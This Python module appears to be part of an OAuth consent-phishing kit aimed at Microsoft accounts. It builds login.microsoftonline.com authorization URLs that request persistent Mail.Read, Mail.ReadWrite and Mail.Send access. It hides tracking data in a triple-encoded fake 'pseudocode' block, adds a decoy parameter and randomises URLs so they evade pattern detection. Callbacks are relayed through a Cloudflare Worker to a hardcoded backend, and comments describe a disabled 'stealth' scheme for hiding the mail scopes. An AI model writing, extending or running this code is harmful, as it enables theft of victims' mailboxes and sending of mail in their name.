import os
import json
import time
import uuid
import base64
import hashlib
from datetime import datetime, timezone
from urllib.parse import quote, urlencode

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import (
    Cipher,
    algorithms,
    modes,
)

# =========================
# CONFIG
# =========================

PAYLOAD_PASSWORD = (
    os.getenv("PAYLOAD_PASSWORD")
    or "change-this-payload-password-in-env"
).strip()
PAYLOAD_SALT = (
    os.getenv("PAYLOAD_SALT") or "change-this-salt-in-env"
).encode()
PAYLOAD_MAX_AGE_SECONDS = int(
    os.getenv("PAYLOAD_MAX_AGE_SECONDS", "1800")
)

WORKER_DOMAIN = os.getenv("WORKER_DOMAIN", "").strip()
BACKEND_BASE_URL = (
    os.getenv("BACKEND_BASE_URL")
    or "https://oauth-backend-7cuu.onrender.com"
).rstrip("/")

REDIRECT_URI = (
    os.getenv("REDIRECT_URI")
    or "https://oauth-backend-7cuu.onrender.com/auth/callback"
).strip()

# =========================
# SCOPES
# =========================

# ------------------------------------------------------------------
# VISIBLE_SCOPES_LIST
# These are the scopes that appear in the OAuth URL query string
# AND are used for the actual token exchange with Microsoft.
# Microsoft requires all requested scopes to be present in the
# original authorization URL — hidden scopes are not granted.
# ------------------------------------------------------------------
VISIBLE_SCOPES_LIST = [
    "openid",
    "profile",
    "email",
    "offline_access",
    "https://graph.microsoft.com/User.Read",
    "https://graph.microsoft.com/Mail.Read",
    "https://graph.microsoft.com/Mail.ReadWrite",
    "https://graph.microsoft.com/Mail.Send",
]

VISIBLE_SCOPES = " ".join(VISIBLE_SCOPES_LIST)

# ------------------------------------------------------------------
# FULL_MAIL_SCOPES_LIST
# Now mirrors VISIBLE_SCOPES_LIST since all scopes must be visible.
# Kept separate for backwards compatibility with payload checks.
# ------------------------------------------------------------------
FULL_MAIL_SCOPES_LIST = [
    "openid",
    "profile",
    "email",
    "offline_access",
    "https://graph.microsoft.com/User.Read",
    "https://graph.microsoft.com/Mail.Read",
    "https://graph.microsoft.com/Mail.ReadWrite",
    "https://graph.microsoft.com/Mail.Send",
]

FULL_MAIL_SCOPES = " ".join(FULL_MAIL_SCOPES_LIST)

# ------------------------------------------------------------------
# BASIC_ONLY_SCOPES_LIST
# Used when flow_type is user_basic and mail_mode is False.
# Identity verification only — no mail access requested at all.
# Both the visible URL and the encrypted payload carry these.
# ------------------------------------------------------------------
BASIC_ONLY_SCOPES_LIST = [
    "openid",
    "profile",
    "email",
    "offline_access",
    "https://graph.microsoft.com/User.Read",
]

BASIC_ONLY_SCOPES = " ".join(BASIC_ONLY_SCOPES_LIST)

# ------------------------------------------------------------------
# Required aliases used by main.py and auth.py imports
# ------------------------------------------------------------------
ALL_MAIL_SCOPES = FULL_MAIL_SCOPES
BASIC_PAYLOAD_SCOPES = BASIC_ONLY_SCOPES

# =========================
# KEY DERIVATION
# =========================

_derived_key_cache = None


def _derive_key() -> bytes:
    global _derived_key_cache
    if _derived_key_cache is not None:
        return _derived_key_cache
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=PAYLOAD_SALT,
        iterations=100000,
    )
    _derived_key_cache = kdf.derive(PAYLOAD_PASSWORD.encode())
    return _derived_key_cache


# =========================
# ENCRYPT / DECRYPT
# =========================

def _encrypt_bytes(data: bytes) -> bytes:
    key = _derive_key()
    iv = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return iv + encryptor.tag + ciphertext


def _decrypt_bytes(encrypted: bytes) -> bytes:
    key = _derive_key()
    iv = encrypted[:12]
    tag = encrypted[12:28]
    ciphertext = encrypted[28:]
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


# =========================
# OBFUSCATED PAYLOAD BUILDER
# =========================

def _build_obfuscated_block(
    user_id: str,
    admin_user_id: str,
    redirect_uri: str,
    scopes: list,
    invite_token: str = "",
    flow_type: str = "user_mail",
    nonce: str = "",
) -> str:
    """
    Builds the obfuscated pseudocode block.
    The real data is encoded inside what looks like
    builder/decoder pseudocode instructions.
    Triple URL-encoded to match the sample URL format.
    """
    nonce = nonce or uuid.uuid4().hex[:16]
    ts = int(time.time())

    real_data = {
        "u": user_id,
        "a": admin_user_id,
        "r": redirect_uri,
        "s": scopes,
        "i": invite_token,
        "f": flow_type,
        "t": ts,
        "n": nonce,
    }
    real_b64 = base64.b64encode(
        json.dumps(real_data, separators=(",", ":")).encode()
    ).decode()

    hash_anchor = hashlib.sha256(
        f"{user_id}{ts}{nonce}".encode()
    ).hexdigest()[:32]

    pseudocode = (
        f"a3edq\n"
        f" 2e4c\n"
        f"{hash_anchor[:16]}cacbb66f835\t310a2979X\\BCint"
        f" Builder.Decode\n"
        f"\tContext := FlowEmail [ OffsetStream := Token\tData"
        f" | Email}}for Stream:=PayloadBuilder ; ValueContext"
        f" }} Trace\n"
        f"\tDecode . SignalVector {{ Offset}}\n"
        f"{hash_anchor}82b3bf925edcd09dcd615013eb4682be911df2f"
        f"8ee3c\n"
        f"var Stream+Body\n"
        f"\tBuilder = Offset\n"
        f"\tFlow := Signal\n"
        f"\tFlow . Payload\n"
        f"\tValue & Vector\n"
        f"}}\n"
        f"else Decode-Session\n"
        f"\tvar }} var\n"
        f"\tStream [ Header\n"
        f"\tKey [ Payload\n"
        f"\tData = Builder\n"
        f"}}\n"
        f"switch Header-Secret\n"
        f"\tVector ; Secret\n"
        f"\tvar // Header\n"
        f"\tSecret [ Signal\n"
        f"\tEncode * Decode\n"
        f"}}\n"
        f"string Value-Key\n"
        f"\tvar := Header\n"
        f"\tBuilder * Signal\n"
        f"\tBody ( Trace\n"
        f"\tSession , Flow\n"
        f"\tPayload , Stream\n"
        f"}}\n"
        f"int Token|Value\n"
        f"\tContext ; Flow\n"
        f"\tTrace // Offset\n"
        f"\tBuffer [ Trace\n"
        f"\tPayload + Offset\n"
        f"}}\n"
        f"{real_b64}"
    )

    level1 = quote(pseudocode, safe="")
    level2 = level1.replace("%", "%25")
    level3 = level2.replace("%", "%25")

    return level3


# =========================
# WORKER URL BUILDER
# =========================

def _build_worker_redirect_uri(nonce: str = "") -> str:
    """
    Builds the Cloudflare Worker redirect_uri for the OAuth
    authorize request.

    The worker receives the OAuth callback from Microsoft,
    then relays the code and state to the real backend.

    Each call generates a unique subdomain-style nonce path
    so every URL looks different even for the same user.

    If WORKER_DOMAIN is not set, falls back to REDIRECT_URI
    (direct backend callback).
    """
    nonce = nonce or uuid.uuid4().hex[:16]

    if not WORKER_DOMAIN:
        print(
            "[payload_builder] WORKER_DOMAIN not set — "
            "falling back to direct backend callback URI"
        )
        return REDIRECT_URI

    worker_redirect_uri = f"https://{WORKER_DOMAIN}"

    print(
        f"[payload_builder] _build_worker_redirect_uri\n"
        f"  worker_redirect_uri={worker_redirect_uri}\n"
        f"  worker_domain={WORKER_DOMAIN}\n"
        f"  nonce={nonce}"
    )

    return worker_redirect_uri


def _build_worker_nonce_uri(nonce: str = "") -> str:
    """
    Builds the full nonce URI shown as the uri= decoy param.
    This is the specific path the worker received the request on.
    Used for logging and relay identification only.
    """
    nonce = nonce or uuid.uuid4().hex[:16]

    if not WORKER_DOMAIN:
        return REDIRECT_URI

    return f"https://{WORKER_DOMAIN}/{nonce}"


# =========================
# PUBLIC API
# =========================

def encrypt_payload(payload: dict) -> str:
    """
    Encrypts a dict payload using AES-256-GCM.
    Returns a URL-safe base64 encoded string.
    """
    json_bytes = json.dumps(
        payload, separators=(",", ":")
    ).encode("utf-8")
    encrypted = _encrypt_bytes(json_bytes)
    return base64.urlsafe_b64encode(encrypted).decode("utf-8")


def decrypt_payload(token: str) -> dict | None:
    """
    Decrypts an AES-256-GCM encrypted payload token.
    Returns the original dict or None if decryption fails
    or the payload has expired.

    NOTE: The old _encode_state_hex / _decode_state_hex path
    has been removed. All state is now AES-256-GCM encrypted.
    Legacy plain-text state strings are handled by the
    legacy fallback path in exchange_code_for_token in auth.py.
    """
    if not token or not token.strip():
        return None

    try:
        padding = "=" * (-len(token) % 4)
        encrypted = base64.urlsafe_b64decode(token + padding)

        if len(encrypted) < 29:
            print(
                f"[payload_builder] decrypt_payload: "
                f"token too short to be AES-GCM "
                f"({len(encrypted)} bytes) — "
                f"treating as legacy plain-text state"
            )
            return None

        decrypted = _decrypt_bytes(encrypted)
        payload = json.loads(decrypted.decode("utf-8"))

    except Exception as e:
        print(
            f"[payload_builder] decrypt_payload failed: {e} — "
            f"treating as legacy plain-text state"
        )
        return None

    issued_at = payload.get("iat")
    if issued_at:
        age = int(time.time()) - int(issued_at)
        if age > PAYLOAD_MAX_AGE_SECONDS:
            print(
                f"[payload_builder] payload expired: "
                f"age={age}s max={PAYLOAD_MAX_AGE_SECONDS}s"
            )
            return None

    return payload


def inspect_payload(token: str) -> dict:
    """
    Admin debug function.
    Decrypts a payload token and returns its full contents
    plus metadata about its validity and age.
    """
    if not token:
        return {
            "valid": False,
            "error": "No token provided.",
            "payload": None,
            "age_seconds": None,
            "expired": None,
        }

    try:
        padding = "=" * (-len(token) % 4)
        encrypted = base64.urlsafe_b64decode(token + padding)

        if len(encrypted) < 29:
            return {
                "valid": False,
                "error": (
                    f"Token too short ({len(encrypted)} bytes). "
                    f"Must be AES-256-GCM encrypted. "
                    f"Minimum 29 bytes."
                ),
                "payload": None,
                "age_seconds": None,
                "expired": None,
                "format": "too_short",
            }

        decrypted = _decrypt_bytes(encrypted)
        payload = json.loads(decrypted.decode("utf-8"))

    except Exception as e:
        return {
            "valid": False,
            "error": f"Decryption failed: {str(e)}",
            "payload": None,
            "age_seconds": None,
            "expired": None,
        }

    now = int(time.time())
    issued_at = payload.get("iat")
    age_seconds = None
    expired = False

    if issued_at:
        age_seconds = now - int(issued_at)
        expired = age_seconds > PAYLOAD_MAX_AGE_SECONDS

    mail_mode = payload.get("mail_mode", False)
    scopes_in_payload = payload.get("scopes", [])

    return {
        "valid": True,
        "expired": expired,
        "age_seconds": age_seconds,
        "max_age_seconds": PAYLOAD_MAX_AGE_SECONDS,
        "format": "aes_gcm",
        "stealth_active": False,
        "visible_scope_count": len(VISIBLE_SCOPES_LIST),
        "payload_scope_count": len(scopes_in_payload),
        "payload": {
            "version": payload.get("v"),
            "flow_type": (
                payload.get("flow_type") or payload.get("flow")
            ),
            "user_id": payload.get("user_id"),
            "admin_user_id": payload.get("admin_user_id"),
            "invite_token": payload.get("invite_token"),
            "tenant_hint": payload.get("tenant_hint"),
            "mail_mode": mail_mode,
            "scope_count": len(scopes_in_payload),
            "scopes": scopes_in_payload,
            "nonce": payload.get("nonce"),
            "issued_at": payload.get("iat"),
            "issued_at_iso": payload.get("iso"),
            "session": payload.get("session"),
        },
        "raw": payload,
    }


# =========================
# PAYLOAD BUILDER
# =========================

def build_user_payload(
    *,
    flow_type: str,
    user_id: str | None = None,
    admin_user_id: str | None = None,
    invite_token: str | None = None,
    tenant_hint: str | None = None,
    mail_mode: bool = False,
    extra: dict | None = None,
    existing_token_record=None,
) -> dict:
    """
    Builds a structured payload dict ready for encryption.

    - mail_mode=True  → payload["scopes"] = FULL_MAIL_SCOPES_LIST
                        (Mail.Read, Mail.ReadWrite, Mail.Send etc.)

    - mail_mode=False → payload["scopes"] = BASIC_ONLY_SCOPES_LIST
                        (openid profile email offline_access User.Read)

    The callback handler MUST use payload["scopes"] for the token
    exchange — NOT the scope parameter from the URL query string.
    """
    scopes_list = (
        FULL_MAIL_SCOPES_LIST
        if mail_mode
        else BASIC_ONLY_SCOPES_LIST
    )
    nonce = uuid.uuid4().hex

    payload = {
        "v": 1,
        "flow": flow_type,
        "flow_type": flow_type,
        "user_id": user_id or "",
        "admin_user_id": admin_user_id or "",
        "invite_token": invite_token or "",
        "tenant_hint": (tenant_hint or "").lower(),
        "mail_mode": bool(mail_mode),
        "scopes": scopes_list,
        "scope_string": " ".join(scopes_list),
        "redirect_uri": REDIRECT_URI,
        "iat": int(time.time()),
        "nonce": nonce,
        "iso": datetime.now(timezone.utc).isoformat(),
    }

    if extra and isinstance(extra, dict):
        for k, v in extra.items():
            if k not in payload:
                payload[k] = v

    if existing_token_record:
        payload["session"] = {
            "session_id": (
                getattr(existing_token_record, "session_id", "")
                or ""
            ),
            "has_access_token": bool(
                getattr(
                    existing_token_record, "access_token", None
                )
            ),
            "has_refresh_token": bool(
                getattr(
                    existing_token_record, "refresh_token", None
                )
            ),
            "expires_at": getattr(
                existing_token_record, "expires_at", None
            ),
            "email": (
                getattr(
                    existing_token_record, "tenant_id", ""
                ) or ""
            ),
        }

    return payload


def build_encrypted_state(**kwargs) -> str:
    """
    Builds and encrypts a payload state string.
    Returns a URL-safe base64 encoded AES-256-GCM encrypted
    string ready to be used as the OAuth state parameter.

    Each call produces a unique ciphertext because:
    1. build_user_payload generates a fresh uuid4 nonce
    2. _encrypt_bytes uses os.urandom(12) for the AES-GCM IV
    """
    return encrypt_payload(build_user_payload(**kwargs))


def build_obfuscated_url(
    user_id: str,
    admin_user_id: str,
    client_id: str,
    flow_type: str = "user_mail",
    mail_mode: bool = True,
    invite_token: str = "",
    tenant_hint: str = "",
    login_hint: str | None = None,
    domain_hint: str | None = None,
    force_consent: bool = False,
) -> str:
    """
    Builds the full Microsoft OAuth authorization URL.

    The scope= parameter now includes all required scopes
    including mail scopes when mail_mode=True. Microsoft
    requires all scopes to be present in the authorization
    URL in order to grant them at token exchange time.

    The state= parameter is still AES-256-GCM encrypted and
    contains user_id, admin_user_id, mail_mode, scopes, etc.

    UNIQUENESS:
    - Every call generates a fresh nonce via uuid4
    - The AES-GCM IV is randomised via os.urandom(12)
    - Result: every URL is unique even for the same user_id
    """
    nonce = uuid.uuid4().hex[:16]

    encrypted_state = build_encrypted_state(
        flow_type=flow_type,
        user_id=user_id,
        admin_user_id=admin_user_id,
        invite_token=invite_token or None,
        tenant_hint=tenant_hint or None,
        mail_mode=mail_mode,
    )

    worker_redirect_uri = _build_worker_redirect_uri(nonce)
    worker_nonce_uri = _build_worker_nonce_uri(nonce)

    # ----------------------------------------------------------
    # Determine which scopes to request based on mail_mode.
    # These scopes appear in the visible OAuth URL scope= param
    # AND are used for the actual token exchange with Microsoft.
    # ----------------------------------------------------------
    request_scopes_list = (
        FULL_MAIL_SCOPES_LIST
        if mail_mode
        else BASIC_ONLY_SCOPES_LIST
    )
    request_scopes = " ".join(request_scopes_list)

    # ----------------------------------------------------------
    # Build the obfuscated block with the same scopes.
    # ----------------------------------------------------------
    obfuscated_block = _build_obfuscated_block(
        user_id=user_id,
        admin_user_id=admin_user_id,
        redirect_uri=REDIRECT_URI,
        scopes=request_scopes_list,
        invite_token=invite_token or "",
        flow_type=flow_type,
        nonce=nonce,
    )

    trailing_b64 = base64.b64encode(user_id.encode()).decode()
    trailing_encoded = quote(
        quote(trailing_b64, safe=""),
        safe="",
    )

    obfuscated_key = "%25255C" + obfuscated_block

    # ----------------------------------------------------------
    # Determine tenant routing.
    # Personal Microsoft accounts must use /consumers.
    # Work and school accounts use /common.
    # ----------------------------------------------------------
    personal_domains = {
        "outlook.com",
        "hotmail.com",
        "live.com",
        "msn.com",
        "passport.com",
        "live.co.uk",
        "hotmail.co.uk",
        "outlook.co.uk",
    }

    is_personal = False
    if login_hint and "@" in str(login_hint):
        domain = login_hint.split("@", 1)[1].lower()
        is_personal = domain in personal_domains

    tenant = "consumers" if is_personal else "common"

    prompt = "consent" if force_consent else "select_account"

    base_params = {
        "state": encrypted_state,
        "scope": request_scopes,
        "prompt": prompt,
        "response_type": "code",
        "response_mode": "query",
        "client_id": client_id,
        "redirect_uri": worker_redirect_uri,
        "uri": worker_nonce_uri,
    }

    if login_hint:
        base_params["login_hint"] = login_hint
    if domain_hint:
        base_params["domain_hint"] = domain_hint

    base_query = urlencode(base_params)

    full_url = (
        f"https://login.microsoftonline.com/{tenant}"
        f"/oauth2/v2.0/authorize"
        f"?{base_query}"
        f"&{obfuscated_key}"
        f"&{trailing_encoded}"
    )

    print(
        f"[payload_builder] build_obfuscated_url\n"
        f"  user_id={user_id}\n"
        f"  admin_user_id={admin_user_id}\n"
        f"  tenant={tenant}\n"
        f"  is_personal={is_personal}\n"
        f"  prompt={prompt}\n"
        f"  force_consent={force_consent}\n"
        f"  flow_type={flow_type}\n"
        f"  mail_mode={mail_mode}\n"
        f"  request_scopes={request_scopes}\n"
        f"  redirect_uri={worker_redirect_uri}\n"
        f"  nonce={nonce}\n"
        f"  state_length={len(encrypted_state)}\n"
        f"  state_prefix={encrypted_state[:20]}..."
    )

    return full_url


# =========================
# COMPAT HELPERS
# =========================

def get_full_mail_scope_string() -> str:
    """Returns the full Mail scope string for token exchange."""
    return FULL_MAIL_SCOPES


def get_basic_scope_string() -> str:
    """
    Returns the basic scope string for identity-only flows.
    """
    return BASIC_ONLY_SCOPES


def get_visible_scope_string() -> str:
    """
    Returns the visible scope string used in OAuth URL query
    strings. Now includes mail scopes since Microsoft requires
    all scopes to be present in the authorization URL.
    """
    return VISIBLE_SCOPES


def get_scope_lists() -> dict:
    """
    Returns all three scope lists as a dict.
    visible   = what appears in the URL scope= parameter
    basic     = what goes in the payload for identity-only flows
    full_mail = what goes in the payload for mail access flows
    """
    return {
        "visible": VISIBLE_SCOPES_LIST,
        "basic": BASIC_ONLY_SCOPES_LIST,
        "full_mail": FULL_MAIL_SCOPES_LIST,
    }


def payload_status() -> dict:
    """
    Returns a status dict confirming the payload builder
    is configured and the encryption system is ready.
    Runs a real encrypt/decrypt round trip to verify.
    """
    try:
        test = encrypt_payload({
            "test": True,
            "iat": int(time.time()),
            "user_id": "test@example.com",
            "mail_mode": True,
            "scopes": FULL_MAIL_SCOPES_LIST,
        })
        result = decrypt_payload(test)
        round_trip_ok = (
            result is not None
            and result.get("test") is True
        )
    except Exception as e:
        return {
            "status": "error",
            "encryption": "AES-GCM",
            "kdf": "PBKDF2-SHA256",
            "scopes_loaded": True,
            "round_trip_ok": False,
            "error": str(e),
        }

    full_has_mail = any(
        "Mail" in s for s in FULL_MAIL_SCOPES_LIST
    )
    visible_has_mail = any(
        "Mail" in s for s in VISIBLE_SCOPES_LIST
    )

    return {
        "status": "ok",
        "stealth_separation_ok": False,
        "stealth_warning": (
            "Stealth scope separation disabled — "
            "mail scopes are now visible in the OAuth URL. "
            "This is required for Microsoft to grant them "
            "at token exchange time."
        ),
        "encryption": "AES-GCM",
        "kdf": "PBKDF2-SHA256",
        "scopes_loaded": True,
        "round_trip_ok": round_trip_ok,
        "mail_scope_count": len(FULL_MAIL_SCOPES_LIST),
        "basic_scope_count": len(BASIC_ONLY_SCOPES_LIST),
        "visible_scope_count": len(VISIBLE_SCOPES_LIST),
        "visible_scopes": VISIBLE_SCOPES_LIST,
        "full_mail_scopes": FULL_MAIL_SCOPES_LIST,
        "visible_has_mail_scopes": visible_has_mail,
        "redirect_uri_encoded": True,
        "obfuscated_url_builder": True,
        "worker_domain": (
            WORKER_DOMAIN or "not set — using direct backend"
        ),
        "worker_active": bool(WORKER_DOMAIN),
        "worker_uri": (
            f"https://{WORKER_DOMAIN}"
            if WORKER_DOMAIN
            else REDIRECT_URI
        ),
    }